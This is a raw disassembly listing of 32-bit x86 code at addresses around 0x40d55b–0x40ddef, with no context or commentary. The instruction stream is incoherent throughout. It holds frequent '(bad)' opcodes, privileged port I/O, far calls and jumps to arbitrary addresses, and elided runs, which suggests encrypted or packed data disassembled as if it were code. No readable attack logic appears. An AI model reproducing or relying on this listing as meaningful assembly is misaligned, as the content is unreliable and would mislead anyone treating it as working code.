  40d55b:	xor    BYTE PTR [esi-0x6951ffea],dh
  40d561:	sub    edi,eax
  40d563:	mov    ebx,0x174a970
  40d568:	inc    ebx
  40d569:	xor    edx,DWORD PTR [esi+ebx*1]
  40d56c:	sub    DWORD PTR [edi-0x56986302],edi
  40d572:	je     0x40d555
  40d574:	jnp    0x40d59a
  40d576:	inc    BYTE PTR [eax]
  40d578:	out    dx,al
  40d579:	jne    0x40d584
  40d57b:	rcr    BYTE PTR [esi+0x7f],0x50
  40d57f:	add    DWORD PTR [ecx+0x6],ebx
  40d582:	push   DWORD PTR [ebp+0x45]
  40d585:	mov    ss,WORD PTR [esi+eiz*2]
  40d588:	dec    esi
  40d589:	jne    0x40d5b4
  40d58b:	shr    dh,0x6b
  40d58e:	rcl    BYTE PTR [ecx+ebx*1],0x8b
  40d592:	cmp    al,0x1
  40d594:	or     DWORD PTR [esi],eax
  40d596:	cmp    DWORD PTR [ebp+0x2d],0x7
  40d59a:	jne    0x40d8a5
  40d5a0:	bnd jne 0x40d58a
  40d5a3:	and    al,0x8
  40d5a5:	push   es
  40d5a6:	add    BYTE PTR [ebx+0x4896eb4],cl
  40d5ac:	push   ebx
  40d5ad:	add    DWORD PTR [ebp-0x10],eax
	...
  40d5c0:	add    BYTE PTR [eax],al
  40d5c2:	repz add dl,BYTE PTR [eax-0x1]
  40d5c6:	add    al,0xab
  40d5c8:	out    0x74,al
  40d5ca:	or     al,0x76
  40d5cc:	std    
  40d5cd:	push   0xffffffd9
  40d5cf:	je     0x40d644
  40d5d1:	adc    al,0x3e
  40d5d3:	out    dx,eax
  40d5d4:	pop    es
  40d5d5:	call   0x3e4304
  40d5da:	inc    edx
  40d5db:	inc    edi
  40d5dc:	adc    al,0x83
  40d5de:	rol    BYTE PTR [edx],1
  40d5e0:	jne    0x40d5f1
  40d5e2:	ds out dx,eax
  40d5e4:	repz call 0x3fb4bb
  40d5ea:	add    al,bl
  40d5ec:	pop    ebp
  40d5ed:	leave  
  40d5ee:	fist   DWORD PTR [ecx]
  40d5f0:	add    BYTE PTR [ebx],cl
  40d5f2:	jmp    0x40d5e5
  40d5f4:	add    al,0xe9
  40d5f6:	mov    ebp,0x5
  40d5fb:	aas    
  40d5fc:	in     al,dx
  40d5fd:	push   0x59
  40d5ff:	je     0x40d674
  40d601:	adc    al,0xf0
  40d603:	adc    BYTE PTR [eax],bh
  40d605:	or     BYTE PTR [eax-0x74],cl
  40d608:	mov    ecx,0x403457fe
  40d60d:	adc    al,0x73
  40d60f:	mov    BYTE PTR [edx],0x75
  40d612:	div    DWORD PTR [eax+0x5748f436]
  40d618:	sub    bh,bh
  40d61a:	aaa    
  40d61b:	adc    al,0xc4
  40d61d:	pop    esi
  40d61e:	cmp    DWORD PTR [ebp+0x17],ebx
  40d621:	add    BYTE PTR [edi],ah
  40d623:	or     cl,al
  40d625:	add    BYTE PTR gs:[eax],al
	...
  40d638:	mov    cl,0x9f
  40d63a:	jg     0x40d680
  40d63c:	or     BYTE PTR [edi+eax*2],dh
  40d63f:	call   0xc140adb7
  40d644:	adc    BYTE PTR [edx+0x5839d1db],bl
  40d64a:	add    eax,DWORD PTR [eax]
  40d64c:	lock mov BYTE PTR [edx+0x79b1d882],dh
  40d653:	inc    esp
  40d654:	rcr    BYTE PTR ds:0x2513e81f,1
  40d65a:	inc    edi
  40d65b:	in     al,dx
  40d65c:	sbb    ebx,ebx
  40d65e:	fwait
  40d65f:	jbe    0x40d653
  40d661:	xchg   esp,eax
  40d662:	fisubr DWORD PTR [edx]
  40d664:	mov    ds:0xbec4725,al
  40d669:	jecxz  0x40d60e
  40d66b:	mov    ah,BYTE PTR ds:0xd3c08556
  40d671:	sbb    al,0x9b
  40d673:	add    ebx,DWORD PTR [edi-0x6faafab1]
  40d679:	daa    
  40d67a:	push   edi
  40d67b:	in     al,0x6b
  40d67d:	pop    ebx
  40d67e:	call   0x7b05:0x3542353a
  40d685:	pop    ebx
  40d686:	mov    ds:0x4724f3ea,al
  40d68b:	in     al,0x77
  40d68d:	pop    es
  40d68e:	pushf  
  40d68f:	pop    ss
  40d690:	outs   dx,DWORD PTR ds:[esi]
  40d691:	xor    cl,BYTE PTR ds:0xe1326754
  40d697:	fwait
  40d698:	nop
  40d699:	mov    al,0xd
  40d69b:	mov    cl,0x0
	...
  40d6ad:	add    dl,ch
  40d6af:	(bad)  
  40d6b0:	jnp    0x40d6b2
  40d6b2:	dec    edi
  40d6b3:	xor    dh,ch
  40d6b5:	fwait
  40d6b6:	in     eax,0x21
  40d6b8:	div    BYTE PTR [eax-0x457238f6]
  40d6be:	xor    DWORD PTR [ebx],edx
  40d6c0:	jmp    0x720b8b3f
  40d6c5:	shl    DWORD PTR [edx+eax*2-0x43],cl
  40d6c9:	push   ebx
  40d6ca:	ins    DWORD PTR es:[edi],dx
  40d6cb:	inc    edx
  40d6cc:	mov    cl,0x53
  40d6ce:	ret    0x629e
  40d6d1:	lods   al,BYTE PTR ds:[esi]
  40d6d2:	push   cs
  40d6d3:	test   al,0x6f
  40d6d5:	inc    esi
  40d6d6:	and    BYTE PTR [eax+0x2117d03b],ch
  40d6dc:	or     eax,0x2383f6b1
  40d6e1:	aam    0xef
  40d6e3:	xor    edi,esp
  40d6e5:	test   BYTE PTR [edi+ecx*8-0x18],ah
  40d6e9:	aaa    
  40d6ea:	pop    es
  40d6eb:	test   al,0x13
  40d6ed:	fcom   st(6)
  40d6ef:	xor    DWORD PTR [ecx+0x7dfb44b0],esp
  40d6f5:	ss clc 
  40d6f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6f8:	sbb    ecx,DWORD PTR [edi+edi*4]
  40d6fb:	xor    DWORD PTR [ecx+0x65abf19b],edx
  40d701:	mov    al,0x36
  40d703:	in     al,dx
  40d704:	fld    TBYTE PTR [ebx-0x4ec67b0a]
  40d70a:	sahf   
  40d70b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d70c:	dec    ebp
  40d70d:	ss pushf 
  40d70f:	sahf   
  40d710:	sub    al,0x27
	...
  40d722:	add    BYTE PTR [eax],al
  40d724:	(bad)  
  40d725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d726:	add    BYTE PTR [edx],0xf0
  40d729:	push   es
  40d72a:	add    cl,ch
  40d72c:	and    BYTE PTR [esi+0x51f3d5c1],bh
  40d732:	mov    edx,DWORD PTR ds:0xf174a7c8
  40d738:	mov    esi,DWORD PTR [ebx+0x1fa01671]
  40d73e:	jmp    FWORD PTR [edx+0x7cff06b2]
  40d744:	dec    ebx
  40d745:	lahf   
  40d746:	cmp    al,0xb6
  40d748:	repz push es
  40d74a:	or     ebp,DWORD PTR [ecx]
  40d74c:	push   es
  40d74d:	add    bl,BYTE PTR [edi+0x20]
  40d750:	sub    eax,0xf4aeffff
  40d755:	push   es
  40d756:	call   DWORD PTR [esp-0x61]
  40d75a:	rcr    BYTE PTR [ebx+0x4f],cl
  40d75d:	test   al,0xbe
  40d75f:	call   0xc6411d13
  40d764:	leave  
  40d765:	(bad)  
  40d766:	push   esi
  40d767:	shr    ebp,1
  40d769:	lock (bad) 
  40d76b:	call   0xe4b53e6a
  40d770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d771:	mov    ebp,0xa2f3f1c1
  40d776:	xor    ch,BYTE PTR [ecx-0x69015aab]
  40d77c:	(bad)  
  40d77d:	cwde   
  40d77e:	lods   eax,DWORD PTR ds:[esi]
  40d77f:	shr    esi,1
  40d781:	sbb    esp,eax
  40d783:	xchg   BYTE PTR [ecx],cl
  40d785:	psubsb mm0,QWORD PTR ds:0x0
	...
  40d798:	add    BYTE PTR [eax],al
  40d79a:	leave  
  40d79b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d79c:	(bad)  
  40d79d:	loop   0x40d752
  40d79f:	sbb    eax,DWORD PTR ds:0x7c8750e
  40d7a5:	jmp    0xa884afb5
  40d7aa:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d7ac:	je     0x40d78f
  40d7ae:	jnp    0x40d782
  40d7b0:	xor    al,0xe9
  40d7b2:	repz adc eax,eax
  40d7b5:	add    BYTE PTR [ebx+eiz*4-0x3],cl
  40d7b9:	jne    0x40d750
  40d7bb:	and    eax,0x4bafcc04
  40d7c0:	add    BYTE PTR [eax-0x7b],ch
  40d7c3:	dec    esi
  40d7c4:	inc    ecx
  40d7c5:	add    BYTE PTR [esi],dl
  40d7c7:	loopne 0x40d7d0
  40d7c9:	call   0x3f7799
  40d7ce:	push   edx
  40d7cf:	retf   0x973
  40d7d2:	out    0xdf,al
  40d7d4:	or     ecx,DWORD PTR [edi+0x4164ba5c]
  40d7da:	pop    ecx
  40d7db:	add    cl,BYTE PTR [ebx+0x44]
  40d7de:	mov    BYTE PTR [edx],cl
  40d7e0:	push   DWORD PTR [ebp+0x51]
  40d7e3:	adc    BYTE PTR [esi+0xb0a1935],0xc0
  40d7ea:	mov    esp,0x1575fda3
  40d7ef:	and    eax,0x4bafd404
  40d7f4:	add    BYTE PTR [eax+0xa18],bh
  40d7fa:	out    0x63,al
  40d7fc:	ror    BYTE PTR [eax],0x0
	...
  40d80f:	add    BYTE PTR [ecx],cl
  40d811:	aas    
  40d812:	mov    ebp,esp
  40d814:	mov    cl,ch
  40d816:	repnz push esi
  40d818:	cs add edi,ebx
  40d81b:	inc    ebx
  40d81c:	sbb    BYTE PTR [ebx],cl
  40d81e:	push   DWORD PTR [ebp-0x2f]
  40d821:	add    DWORD PTR [esi+esi*1-0x3ff4f637],0x5e5f0bcc
  40d82c:	add    bh,0x2
  40d82f:	add    BYTE PTR [ecx],cl
  40d831:	and    ch,bh
  40d833:	mov    eax,esp
  40d835:	mov    eax,ds:0x897d01e9
  40d83a:	cmp    al,0x0
  40d83c:	mov    esp,0xf068a26f
  40d841:	cmp    al,BYTE PTR [edx+0x41]
  40d844:	lock push esp
  40d846:	cmp    BYTE PTR [eax],cl
  40d848:	cwde   
  40d849:	iret   
  40d84a:	hlt    
  40d84b:	inc    DWORD PTR [edi-0x98b3d68]
  40d851:	jl     0x40d89f
  40d853:	leave  
  40d854:	mov    dl,0xab
  40d856:	add    cl,BYTE PTR [ebx+0x219997ed]
  40d85c:	jo     0x40d822
  40d85e:	sti    
  40d85f:	jae    0x40d85a
  40d861:	das    
  40d862:	out    dx,al
  40d863:	or     al,0xdc
  40d865:	fwait
  40d866:	cmp    BYTE PTR [esi],0xfa
  40d869:	and    edi,esi
  40d86b:	jg     0x40d874
  40d86d:	imul   esi,DWORD PTR [esi],0x4f5c700a
  40d873:	je     0x40d875
	...
  40d885:	add    ch,ch
  40d887:	das    
  40d888:	out    dx,al
  40d889:	pop    edi
  40d88a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d88b:	mov    al,0xc4
  40d88d:	push   es
  40d88e:	shr    ah,1
  40d890:	cmp    DWORD PTR [esi],0xfffffff0
  40d893:	inc    edx
  40d894:	retf   
  40d895:	(bad)  
  40d896:	lods   eax,DWORD PTR ds:[esi]
  40d897:	rol    DWORD PTR [ebx],cl
  40d899:	add    al,dh
  40d89b:	scas   eax,DWORD PTR es:[edi]
  40d89c:	ret    
  40d89d:	inc    esp
  40d89e:	or     BYTE PTR [edi+0x28f00002],ch
  40d8a4:	das    
  40d8a5:	or     BYTE PTR [ebx],cl
  40d8a7:	call   0x358172f
  40d8ac:	fld    DWORD PTR [edx+0x75038265]
  40d8b2:	add    al,BYTE PTR [ebp-0x520e07ba]
  40d8b8:	add    al,BYTE PTR [eax]
  40d8ba:	inc    ebp
  40d8bb:	stos   BYTE PTR es:[edi],al
  40d8bc:	ret    
  40d8bd:	inc    esp
  40d8be:	les    ebp,FWORD PTR [edi-0x770ffffe]
  40d8c4:	adc    bh,dh
  40d8c6:	sub    eax,0xf0000316
  40d8cb:	push   es
  40d8cc:	jmp    0xe60dd307
  40d8d1:	jecxz  0x40d889
  40d8d3:	dec    edx
  40d8d4:	push   ebp
  40d8d5:	add    al,0xf0
  40d8d7:	push   es
  40d8d8:	jmp    0xbc83a760
  40d8dd:	push   es
  40d8de:	xchg   DWORD PTR [edx+0x41],ecx
  40d8e1:	cdq    
  40d8e2:	test   bl,0xab
  40d8e5:	stos   DWORD PTR es:[edi],eax
  40d8e6:	ja     0x40d88c
  40d8e8:	call   0x40d8f0
	...
  40d8f9:	add    BYTE PTR [eax],al
  40d8fb:	add    BYTE PTR [ebx+0x22],dh
  40d8fe:	and    eax,0x2707dd03
  40d903:	add    eax,0xed694c10
  40d908:	push   edi
  40d909:	sbb    ebx,DWORD PTR [ecx+0x79]
  40d90c:	int3   
  40d90d:	push   cs
  40d90e:	adc    dl,BYTE PTR [eax]
  40d910:	jo     0x40d8f6
  40d912:	enter  0xe636,0x86
  40d916:	jne    0x40d91a
  40d918:	adc    BYTE PTR [edx],bl
  40d91a:	fst    DWORD PTR [ebx+ebx*1+0xd]
  40d91e:	jae    0x40d964
  40d920:	icebp  
  40d921:	mov    fs,ebp
  40d923:	inc    esp
  40d924:	jo     0x40d90a
  40d926:	call   0x1e84f661
  40d92b:	inc    ebp
  40d92c:	jo     0x40d912
  40d92e:	call   0x240d0069
  40d933:	mov    eax,0x3e8a3ff
  40d938:	imul   ebx,DWORD PTR [edx],0xffffffe1
  40d93b:	js     0x40d9a9
  40d93d:	setb   cl
  40d940:	addr16 in al,0xcc
  40d943:	ss cld 
  40d945:	int3   
  40d946:	in     eax,dx
  40d947:	add    edx,edi
  40d949:	sbb    DWORD PTR [ebp-0x791027ab],edx
  40d94f:	lods   al,BYTE PTR ds:[esi]
  40d950:	(bad)  
  40d951:	pop    gs
  40d953:	test   BYTE PTR ss:[ebx+0x0],0x17
  40d958:	jnp    0x40d91f
  40d95a:	add    ebp,ecx
  40d95c:	sub    BYTE PTR [ebp+0x6645],bl
	...
  40d972:	cs fwait
  40d974:	inc    esi
  40d975:	imul   ecx,DWORD PTR [ebx+eiz*4+0x1a443073],0xf6bb7f4
  40d980:	inc    BYTE PTR [esi+0x54]
  40d983:	inc    esp
  40d984:	pop    esi
  40d985:	xor    BYTE PTR [ecx-0x763fff9],dh
  40d98b:	scas   eax,DWORD PTR es:[edi]
  40d98c:	and    BYTE PTR ds:0x6a5739ab,0x16
  40d993:	sti    
  40d994:	call   DWORD PTR [edx+ebx*2+0x3aa63c88]
  40d99b:	inc    esi
  40d99c:	add    cl,ch
  40d99e:	push   es
  40d99f:	or     eax,0xc58aa75f
  40d9a4:	psubsw mm7,QWORD PTR [eax-0x114febb6]
  40d9ab:	shl    BYTE PTR [ebp-0x58],cl
  40d9ae:	repz adc eax,DWORD PTR [ebx+0x6ed8a]
  40d9b5:	and    cl,dh
  40d9b7:	mov    dh,0x65
  40d9b9:	sub    ah,ch
  40d9bb:	adc    eax,DWORD PTR [ebx+0x6f576]
  40d9c1:	add    cl,dh
  40d9c3:	mov    edx,0x13f42865
  40d9c8:	and    DWORD PTR [edx-0x13],0x6
  40d9cc:	add    BYTE PTR [ecx+esi*1-0x65],bl
  40d9d0:	dec    edi
  40d9d1:	je     0x40da04
  40d9d3:	lahf   
  40d9d4:	dec    edi
  40d9d5:	ins    BYTE PTR es:[edi],dx
	...
  40d9e6:	add    BYTE PTR [eax],al
  40d9e8:	xor    DWORD PTR [ebx-0x311e69b1],esp
  40d9ee:	gs sub ah,dh
  40d9f1:	mov    eax,ds:0x7ea90074
  40d9f6:	mov    esp,0x8b6e3ef8
  40d9fb:	inc    ebp
  40d9fc:	jno    0x40da39
  40d9fe:	lea    eax,[ebp+0x2d]
  40da01:	cmp    ecx,DWORD PTR [ebp-0xc4b6bb]
  40da07:	xor    eax,0x40e4e5
  40da0c:	fmul   DWORD PTR ds:[edi]
  40da0f:	call   0x3e4d89
  40da14:	cld    
  40da15:	inc    edi
  40da16:	fcom   QWORD PTR [eax+0xc]
  40da19:	dec    eax
  40da1a:	loopne 0x40da6c
  40da1c:	or     al,0x48
  40da1e:	in     al,0x50
  40da20:	push   ds
  40da21:	cwde   
  40da22:	into   
  40da23:	cbw    
  40da25:	push   es
  40da26:	push   DWORD PTR [ebp+0x59]
  40da29:	jle    0x40d9b3
  40da2b:	clc    
  40da2c:	(bad)  
  40da2d:	ins    DWORD PTR es:[edi],dx
  40da2e:	std    
  40da2f:	jne    0x40da26
  40da31:	sbb    eax,0xd7eed444
  40da36:	fisttp DWORD PTR [edi+0x45c5ce94]
  40da3c:	(bad)  [edx]
  40da3e:	add    BYTE PTR [eax],al
  40da40:	sbb    DWORD PTR [edi],ebx
  40da42:	inc    esp
  40da43:	int3   
  40da44:	jmp    0x9aadb49
  40da49:	add    al,0x0
  40da4b:	push   0x0
	...
  40da5d:	add    BYTE PTR [ecx],cl
  40da5f:	add    al,0x0
  40da61:	(bad)  
  40da62:	aam    0xb6
  40da64:	dec    esi
  40da65:	jmp    DWORD PTR [ebx*8-0x5ef6bed8]
  40da6c:	mov    esi,0xffa3850f
  40da71:	(bad)  
  40da72:	(bad)  [eax-0x63262f85]
  40da78:	add    BYTE PTR [eax],0xc8
  40da7b:	add    eax,0xeaf08b00
  40da80:	mov    bh,0x3a
  40da82:	cmp    eax,0xbc86f98c
  40da87:	scas   eax,DWORD PTR es:[edi]
  40da88:	add    al,BYTE PTR [eax]
  40da8a:	mov    esp,0x6bd03014
  40da8f:	call   0x1a5:0x843d8ac6
  40da96:	mov    ds:0xac74a993,eax
  40da9b:	xor    BYTE PTR [eax-0x1c],al
  40da9e:	xchg   edi,eax
  40da9f:	ret    0xe7d2
  40daa2:	scas   eax,DWORD PTR es:[edi]
  40daa3:	std    
  40daa4:	add    eax,DWORD PTR [eax]
  40daa6:	jae    0x40da72
  40daa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40daa9:	(bad)  
  40daaa:	out    dx,al
  40daab:	sub    edi,DWORD PTR [ecx-0x7a508801]
  40dab1:	jl     0x40db13
  40dab3:	scas   eax,DWORD PTR es:[edi]
  40dab4:	stc    
  40dab5:	sub    DWORD PTR [edi+ebp*4],0x2
  40dab9:	add    BYTE PTR [ebx-0x7e],dh
  40dabc:	sahf   
  40dabd:	jmp    esi
  40dabf:	xor    ebp,DWORD PTR [ebp-0x1]
	...
  40dad2:	add    BYTE PTR [eax],al
  40dad4:	dec    edi
  40dad5:	scas   eax,DWORD PTR es:[edi]
  40dad6:	test   eax,0x6cf74474
  40dadb:	pusha  
  40dadc:	aas    
  40dadd:	mov    al,ds:0x9828447a
  40dae2:	cs cld 
  40dae4:	das    
  40dae5:	sbb    bh,BYTE PTR [ebx-0x643c6202]
  40daeb:	fist   WORD PTR [ecx-0x45985740]
  40daf1:	repz inc edx
  40daf3:	add    BYTE PTR [eax],bl
  40daf5:	inc    ebx
  40daf6:	idiv   bh
  40daf8:	pop    es
  40daf9:	call   FWORD PTR [ebx]
  40dafb:	pop    edx
  40dafc:	mov    ah,0xee
  40dafe:	add    edi,edi
  40db00:	jge    0x40db69
  40db02:	fwait
  40db03:	sub    eax,0xb02ae24
  40db08:	mov    al,0x7
  40db0a:	sbb    eax,0x2526480c
  40db0f:	inc    ebx
  40db10:	lock scas al,BYTE PTR es:[edi]
  40db12:	sbb    dh,dh
  40db14:	iret   
  40db15:	mov    al,ds:0x4b511c38
  40db1a:	sub    BYTE PTR [edi+edi*4],al
  40db1d:	sbb    dh,BYTE PTR [ecx-0x17251e64]
  40db23:	add    edi,ebx
  40db25:	(bad)  
  40db26:	hlt    
  40db27:	or     ebx,DWORD PTR [eax]
  40db29:	lods   eax,DWORD PTR cs:[esi]
  40db2b:	inc    edx
  40db2c:	lock scas al,BYTE PTR es:[edi]
  40db2e:	mov    ah,0xf5
  40db30:	xchg   edi,eax
  40db31:	mov    al,ds:0x4b191bb8
  40db36:	test   al,0x3
	...
  40db48:	add    BYTE PTR [eax],al
  40db4a:	xchg   DWORD PTR [edx],ebx
  40db4c:	xor    DWORD PTR [ebp+eax*4-0x14fc172c],ebx
  40db53:	(bad)  
  40db54:	mov    ebx,0xe906d83e
  40db59:	cwde   
  40db5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db5b:	mov    al,ds:0x5d57f79b
  40db60:	mov    ebx,0xdba056a8
  40db65:	mov    ebx,0xa8e945d5
  40db6a:	mov    esp,0x9c581112
  40db6f:	lahf   
  40db70:	std    
  40db71:	test   al,0xbc
  40db73:	mov    ds:0xa0242ef5,al
  40db78:	jae    0x40db71
  40db7a:	btc    DWORD PTR [ebx-0x57],eax
  40db7e:	push   ds
  40db7f:	mov    al,ds:0x1a16b453
  40db84:	shr    DWORD PTR [eax-0x3e3eed7c],0xa4
  40db8b:	lahf   
  40db8c:	lds    ebp,FWORD PTR [eax+0x2ebdaa84]
  40db92:	adc    al,0xa0
  40db94:	(bad)  
  40db95:	cmp    ebp,eax
  40db97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db98:	mov    bh,0xc
  40db9a:	cdq    
  40db9b:	mov    al,ds:0xa79c1cfe
  40dba0:	lock or DWORD PTR [ecx-0x74c8a160],ecx
  40dba7:	lds    ecx,FWORD PTR [edi]
  40dba9:	jmp    0x6b2c67e4
	...
  40dbbe:	add    BYTE PTR [eax],al
  40dbc0:	jg     0x40db69
  40dbc2:	cmp    ah,0xe7
  40dbc5:	or     DWORD PTR [edi],ecx
  40dbc7:	ins    BYTE PTR es:[edi],dx
  40dbc8:	add    al,0x6
  40dbca:	add    cl,ch
  40dbcc:	push   ds
  40dbcd:	dec    ebx
  40dbce:	hlt    
  40dbcf:	mov    ecx,0xb9f84b26
  40dbd4:	push   ds
  40dbd5:	dec    ebx
  40dbd6:	cld    
  40dbd7:	mov    ecx,0xd4ff04ed
  40dbdc:	jecxz  0x40db8c
  40dbde:	and    BYTE PTR [esi],bh
  40dbe0:	dec    eax
  40dbe1:	mov    al,ds:0x64bbc82
  40dbe6:	(bad)  
  40dbe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dbe9:	lahf   
  40dbea:	(bad)  
  40dbeb:	jmp    0x7734f688
  40dbf0:	push   ds
  40dbf1:	xchg   edi,eax
  40dbf2:	rcl    DWORD PTR [bx],cl
  40dbf5:	inc    esi
  40dbf6:	add    BYTE PTR [esi],dl
  40dbf8:	push   ds
  40dbf9:	xchg   edi,eax
  40dbfa:	out    0xc3,eax
  40dbfc:	cmp    eax,0x33f2fe9f
  40dc01:	adc    BYTE PTR [ebp+0x6f321],al
  40dc07:	fs out dx,al
  40dc09:	call   0x744f:0x9ee65c4f
  40dc10:	mov    cl,0xa2
  40dc12:	dec    edi
  40dc13:	push   ebx
  40dc14:	in     al,dx
  40dc15:	lahf   
  40dc16:	je     0x40dc11
  40dc18:	imul   ebp,DWORD PTR [ecx-0x7bb0310b],0x7c
  40dc1f:	add    BYTE PTR [ecx],dh
  40dc21:	or     DWORD PTR [edi],ecx
  40dc23:	test   DWORD PTR [eax],eax
	...
  40dc35:	add    BYTE PTR [ecx+0xa],dh
  40dc38:	add    BYTE PTR [eax],al
  40dc3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc3b:	fdiv   st,st(3)
  40dc3d:	push   0x414a9c
  40dc42:	adc    DWORD PTR [eax+esi*1-0x415e3700],0xff2a5c0f
  40dc4d:	(bad)  
  40dc4e:	fstp   DWORD PTR [edi]
  40dc50:	inc    esp
  40dc51:	hlt    
  40dc52:	fstp   DWORD PTR [edi]
  40dc54:	inc    esp
  40dc55:	clc    
  40dc56:	fstp   DWORD PTR [edi]
  40dc58:	inc    esp
  40dc59:	cld    
  40dc5a:	or     DWORD PTR [ecx],eax
  40dc5c:	add    edi,edi
  40dc5e:	pushf  
  40dc5f:	cli    
  40dc60:	out    0xb1,eax
  40dc62:	aas    
  40dc63:	data16 std 
  40dc65:	xor    DWORD PTR [edx+esi*2-0x75e3f102],0xfffffffe
  40dc6d:	call   FWORD PTR [ecx+0x36f44421]
  40dc73:	xchg   ebx,eax
  40dc74:	lea    eax,[ebp+0x25]
  40dc77:	and    BYTE PTR [esp+esi*8-0x77],al
  40dc7b:	pop    ds
  40dc7c:	inc    esp
  40dc7d:	clc    
  40dc7e:	mov    DWORD PTR [edi],ebx
  40dc80:	inc    esp
  40dc81:	cld    
  40dc82:	cdq    
  40dc83:	add    BYTE PTR [edi+edi*8],al
  40dc86:	jl     0x40dc82
  40dc88:	out    0x89,eax
  40dc8a:	out    dx,eax
  40dc8b:	gs std 
  40dc8d:	xor    DWORD PTR [edx+esi*2-0x1],0x74
  40dc92:	xchg   esi,eax
  40dc93:	pop    ebp
  40dc94:	add    ecx,esp
  40dc96:	outs   dx,DWORD PTR ds:[esi]
  40dc97:	inc    ebx
  40dc98:	add    bh,bh
	...
  40dcaa:	add    BYTE PTR [eax],al
  40dcac:	es gs std 
  40dcaf:	(bad)  
  40dcb0:	or     al,0xba
  40dcb2:	fs inc ecx
  40dcb4:	or     DWORD PTR [ebp-0x3],esp
  40dcb7:	push   DWORD PTR [esi]
  40dcb9:	pop    ebp
  40dcba:	add    edx,esp
  40dcbc:	lock dec ebp
  40dcbe:	inc    ebp
  40dcbf:	add    BYTE PTR [edi],al
  40dcc1:	int    0xa5
  40dcc3:	(bad)  
  40dcc4:	(bad)  
  40dcc5:	fisubr DWORD PTR [edi-0x5aa40d19]
  40dccb:	(bad)  
  40dccc:	mov    bh,0xea
  40dcce:	fwait
  40dccf:	add    al,dh
  40dcd1:	scas   eax,DWORD PTR es:[edi]
  40dcd2:	add    al,BYTE PTR [ebx+0x411c541d]
  40dcd8:	lock jl 0x40dd09
  40dcdb:	sub    DWORD PTR [ebx-0x4e],esi
  40dcde:	shl    BYTE PTR [ebp+0x31],cl
  40dce1:	mov    al,0xa5
  40dce3:	jae    0x40dcf5
  40dce5:	xor    eax,ebp
  40dce7:	ror    DWORD PTR [esi-0x11],cl
  40dcea:	add    edi,edi
  40dcec:	and    al,0xbd
  40dcee:	sbb    dh,al
  40dcf0:	pop    ebp
  40dcf1:	out    dx,eax
  40dcf2:	add    ecx,DWORD PTR [ebp-0xacc7cb]
  40dcf8:	sbb    eax,0xfc74a64c
  40dcfd:	xor    al,0x30
  40dcff:	or     BYTE PTR [eax+0x7ffeaaa7],bl
  40dd05:	(bad)  
  40dd06:	ror    BYTE PTR [edi],0xf0
  40dd09:	jb     0x40dd84
  40dd0b:	jmp    0x40dd80
  40dd0d:	jmp    0x40dca5
  40dd0f:	inc    BYTE PTR [eax]
	...
  40dd21:	add    ch,bl
  40dd23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd24:	call   0x69:0xa5e4b99c
  40dd2b:	sub    eax,DWORD PTR [eax-0x10]
  40dd2e:	mov    al,ds:0x58082ff4
  40dd33:	xchg   esp,eax
  40dd34:	dec    edx
  40dd35:	(bad)  
  40dd36:	aas    
  40dd37:	cwde   
  40dd38:	ret    0xec74
  40dd3b:	(bad)  
  40dd3c:	rol    BYTE PTR [edi],0xf0
  40dd3f:	mov    DWORD PTR [edx],edx
  40dd41:	push   0x43700d
  40dd46:	ins    DWORD PTR es:[edi],dx
  40dd47:	push   es
  40dd48:	sub    al,0xb4
  40dd4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd4b:	scas   al,BYTE PTR es:[edi]
  40dd4c:	aad    0x45
  40dd4e:	setge  cl
  40dd51:	ret    
  40dd52:	jl     0x40dd56
  40dd54:	mov    al,ds:0xae06f7c2
  40dd59:	aas    
  40dd5a:	add    al,0x7
  40dd5c:	jmp    0x2bcacd64
  40dd61:	cwde   
  40dd62:	aaa    
  40dd63:	pushf  
  40dd64:	xor    edi,esp
  40dd66:	xlat   BYTE PTR ds:[ebx]
  40dd67:	loop   0x40ddab
  40dd69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd6a:	(bad)  
  40dd6b:	adc    BYTE PTR [ecx+0x1387f630],ch
  40dd71:	cwde   
  40dd72:	(bad)  
  40dd73:	adc    esp,edi
  40dd75:	fdivr  DWORD PTR [edi-0x32]
  40dd78:	stos   BYTE PTR es:[edi],al
  40dd79:	cld    
  40dd7a:	mov    bh,0x4c
  40dd7c:	sar    BYTE PTR [edx-0x6367fd66],cl
  40dd82:	and    al,BYTE PTR [esi]
  40dd84:	sub    cl,bh
	...
  40dd96:	add    BYTE PTR [eax],al
  40dd98:	pop    edi
  40dd99:	adc    bl,BYTE PTR [esi+0x4c]
  40dd9c:	jae    0x40dd3d
  40dd9e:	out    0x2e,eax
  40dda0:	cmc    
  40dda1:	pop    esi
  40dda2:	call   0x6a47ceaa
  40dda7:	stos   DWORD PTR es:[edi],eax
  40dda8:	lock adc ch,bh
  40ddab:	fdiv   DWORD PTR [edi]
  40ddad:	into   
  40ddae:	sub    bh,ah
  40ddb0:	outs   dx,DWORD PTR ds:[esi]
  40ddb1:	imul   ebp,DWORD PTR [esi+ebx*1],0x3f5c06b1
  40ddb8:	dec    esp
  40ddb9:	aaa    
  40ddba:	es das 
  40ddbc:	call   0x4f8ac96f
  40ddc1:	pushf  
  40ddc2:	imul   ebp,DWORD PTR [eax+esi*8+0x4780e412],0x72fd7c09
  40ddcd:	sbb    cl,BYTE PTR ds:0x4a504
  40ddd3:	ret    0xcf33
  40ddd6:	shl    ecx,0xf3
  40ddd9:	mov    DWORD PTR [ebp+edx*8-0x3d],eax
  40dddd:	fwait
  40ddde:	je     0x40ddd1
  40dde0:	imul   esi,DWORD PTR [ecx-0x76b329a8],0xfffffff7
  40dde7:	call   0xc1c3dfbb
  40ddec:	icebp  
  40dded:	adc    DWORD PTR [esi],eax
  40ddef:	push   0x16
